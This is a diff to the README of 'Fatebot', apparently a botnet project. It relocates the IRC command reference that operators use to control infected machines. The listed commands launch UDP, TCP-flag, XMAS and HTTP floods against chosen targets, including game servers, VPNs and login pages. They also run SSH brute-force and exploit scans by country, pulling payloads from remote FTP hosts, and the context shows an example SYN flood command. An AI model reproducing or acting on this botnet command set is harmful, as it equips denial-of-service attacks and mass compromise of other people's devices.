@@ -1,45 +1,3 @@
-# Fatebot
- 	ATTACK VECTORS:
-	
-	# The min and max of attack size will be 50 - 1400 bytes. If you put over or lower size it will set to 100 automatically.
-
-	?udp <src> <dst> <port> <size>                Just a normal UDP flood attack.
-	?tcp <flag> <src> <dst> <port> <size>	      TCP flood with customizes flag.
-
-		-syn            TCP flood with syn packet, just a normal SYN flood.
-		-ack		TCP flood with ack packet, just a normal ACK flood.
-		-psh		TCP flood with psh packet, just a normal PSH flood.
-		-urg		TCP flood with urg packet, just a normal URG flood.
-		-rst		TCP flood with RST packet, for broke a TCP connection between client and target server.
-		-fin		TCP flood with FIN packet, to request close connection when target server is blocking a syn packet.
-
-	?saf <src> <dst> <port> <size>                Flood by using TCP SYN+ACK flags to the target server.
-	?xmas <src> <dst> <port> <size>		      Flood TCP packets by using all of the TCP flags to the target server.
-	?vse <src> <dst> <port>			      Flood TSource Engine Query request to the target game server that used valve source engine.
-	?fms <src> <dst>			      Flood query payload to a FiveM game server.
-	?ipsec <src> <dst>			      Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
-	?poling <url>			      	      Flood HTTP post-login requests to the target login web page, didn't do any of IP spoofing!!!
-	?jumbo <url>				      Flood HTTP post request with a big XML payload, didn't do any of IP spoofing!!!
-	?get <url>			      	      Flood HTTP get requests to the target website, didn't do any of IP spoofing!!!
-
-	SCAN FUNCTION:
-		
-	# Example: ?scan -r ftp://1.2.3.4/bin/payload_x32 ftp://5.6.7.8/bin/payload_mips_x32 ftp://4.3.2.1/bin/payload_arm_x32
-		
-	?scan <network> <default> <mips> <arm>		Scan default SSH and HTTP port on the network. Brute-force attack, and exploit the target.
-
-		-cn		Scan on China network.
-		-usa		Scan on U.S.A network.
-		-kr		Scan on south korea network.
-		-br		Scan on brazil network.
-		-r		Scan with random IPs.
-		
-	?update <default> <mips> <arm>          Update the bot source code or adapt it as a service.
-	?info				        Get bot system information, for bot analysis, etc.
-	?kill				        Bot self-close.
-	?stopddos 			        Stop DDoS attacking.
-	?stopscan			        Stop scanning.
-
 # Scanner Method
 This botnet will primarily scan on SSH default port to brute-force attack, and HTTP for IoT or server vulnerabilities exploit. <b>The "main" scanning method that's involves SSH default port brute-force attack, which mostly used by servers. Also the loader process are not that effective for multiple architecture. So, do not expect many bot hits.</b> 
 
@@ -145,6 +103,48 @@ The attack feature will mostly focus on the transport layer attack, but it will 
 	# tcp -syn 127.0.0.1 192.168.50.129 -r 100
 
 <img src="assets/synflood.png" alt="synflood, DoS example">
+
+# IRC Commands
+ 	ATTACK VECTORS:
+	
+	# The min and max of attack size will be 50 - 1400 bytes. If you put over or lower size it will set to 100 automatically.
+
+	?udp <src> <dst> <port> <size>                Just a normal UDP flood attack.
+	?tcp <flag> <src> <dst> <port> <size>	      TCP flood with customizes flag.
+
+		-syn            TCP flood with syn packet, just a normal SYN flood.
+		-ack		TCP flood with ack packet, just a normal ACK flood.
+		-psh		TCP flood with psh packet, just a normal PSH flood.
+		-urg		TCP flood with urg packet, just a normal URG flood.
+		-rst		TCP flood with RST packet, for broke a TCP connection between client and target server.
+		-fin		TCP flood with FIN packet, to request close connection when target server is blocking a syn packet.
+
+	?saf <src> <dst> <port> <size>                Flood by using TCP SYN+ACK flags to the target server.
+	?xmas <src> <dst> <port> <size>		      Flood TCP packets by using all of the TCP flags to the target server.
+	?vse <src> <dst> <port>			      Flood TSource Engine Query request to the target game server that used valve source engine.
+	?fms <src> <dst>			      Flood query payload to a FiveM game server.
+	?ipsec <src> <dst>			      Flood payload to overwhelm system resources of VPN service and make IPSec VPN connections being affected.
+	?poling <url>			      	      Flood HTTP post-login requests to the target login web page, didn't do any of IP spoofing!!!
+	?jumbo <url>				      Flood HTTP post request with a big XML payload, didn't do any of IP spoofing!!!
+	?get <url>			      	      Flood HTTP get requests to the target website, didn't do any of IP spoofing!!!
+
+	SCAN FUNCTION:
+		
+	# Example: ?scan -r ftp://1.2.3.4/bin/payload_x32 ftp://5.6.7.8/bin/payload_mips_x32 ftp://4.3.2.1/bin/payload_arm_x32
+		
+	?scan <network> <default> <mips> <arm>		Scan default SSH and HTTP port on the network. Brute-force attack, and exploit the target.
+
+		-cn		Scan on China network.
+		-usa		Scan on U.S.A network.
+		-kr		Scan on south korea network.
+		-br		Scan on brazil network.
+		-r		Scan with random IPs.
+		
+	?update <default> <mips> <arm>          Update the bot source code or adapt it as a service.
+	?info				        Get bot system information, for bot analysis, etc.
+	?kill				        Bot self-close.
+	?stopddos 			        Stop DDoS attacking.
+	?stopscan			        Stop scanning.
 	
 # Build Payload
 
